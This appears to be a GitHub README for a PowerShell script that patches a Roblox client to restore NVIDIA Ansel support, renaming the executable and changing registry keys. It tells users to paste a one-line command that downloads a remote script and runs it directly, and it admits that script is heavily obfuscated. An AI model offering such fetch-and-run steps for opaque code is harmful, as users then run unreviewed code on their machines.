Ansel Builder for Roblox

This is a powershell script that uses your current roblox client and re-builds it with some old files from the last known version where NVIDIA Ansel was supported.

## What does this script do?

- It downloads an older build of Roblox (around 90MB) and merges it with your current client.
- Renames RobloxPlayerBeta.exe to Minecraft.exe for Ansel/Game Filter compatibility.
- Changes registry keys to open Roblox from the browser
- Restores Desktop/Program Shortcuts for Roblox

## How do I run the file?

__Download the .ps1 file [here](https://github.com/chrowmiee/NVIDIABuild/releases/download/archive/NVIDIA.ps1), then right click on it and "Run with Powershell"__

**OR** 

✨ __Run the code using Powershell (Recommended)__ 
- __**Open Windows Powershell, paste this code and hit Enter.**__
  
```powershell -c "iwr https://github.com/chrowmiee/NVIDIABuild/releases/download/archive/NVIDIA.ps1 | iex"```

⚠️  **Do not close the script while it's extracting! **
 This may corrupt your current client, and you'll have to reinstall Roblox.

❌   **Close Roblox before running the script.**
Make sure Roblox is fully closed, check your Task Manager and end all processes; otherwise an error will pop-up. 

**🟩 NVIDIA ONLY** 
As always, this uses NVIDIA Ansel for Windows, and will not be supported by any non-NVIDIA GPUs.

✅ **The code is heavily obfuscated because I don't want people to modify the code and take my name taken out of the credits, thank you for understanding.**

This is a very robust and hacky solution, probably won't work in the future.
If you're having any issues with the script, please DM me @ chrowmii for support.
